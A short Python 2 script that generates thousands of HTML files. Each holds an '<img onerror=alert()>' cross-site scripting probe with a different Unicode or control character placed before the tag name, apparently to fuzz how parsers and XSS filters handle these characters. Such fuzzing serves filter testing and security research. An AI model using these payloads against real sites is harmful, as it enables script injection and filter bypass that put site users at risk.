import unicodedata

base_payload = u'<%simg src=1 onerror=alert(%s)>'

for num in range(0x000, 0xfff):
    with open("{}.html".format(num), "w") as f:
        payload = ''
        if unicodedata.category(unichr(num)) == 'Cc':
            payload = r'\x{0:02x}'.format(num)
            payload = base_payload.encode('utf-8') %(payload, payload)
        else:
            payload = unichr(num)
            payload = (base_payload %(payload, payload)).encode('utf-8')
        f.write(payload)
        print("{}.html".format(num))